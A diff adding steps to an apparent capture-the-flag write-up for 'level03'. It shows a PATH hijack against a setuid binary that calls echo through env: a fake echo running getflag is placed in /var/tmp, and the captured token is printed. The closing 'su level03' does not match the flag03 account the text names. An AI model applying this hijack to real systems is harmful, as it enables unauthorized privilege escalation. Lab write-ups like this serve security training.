@@ -23,3 +23,24 @@ int main()
     return system("/usr/bin/env echo Exploit me");
 }
 
+3. We can see that the echo is not called through the absolute path.
+Hence we can create our own echo to launch the getflag command and add the path of this script before the /usr/bin where the original echo is located.
+
+4. creation of the personnalized echo command : 
+
+echo "getflag" > /var/tmp/echo
+
+5. Adding execution permission on our prgm : 
+
+chmod +x /var/tmp/echo
+
+6. Launching level03
+
+<< ./level03
+>> Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
+
+this is the flag03 password
+
+7. Connecting to flag03 and launching getflag
+
+su level03
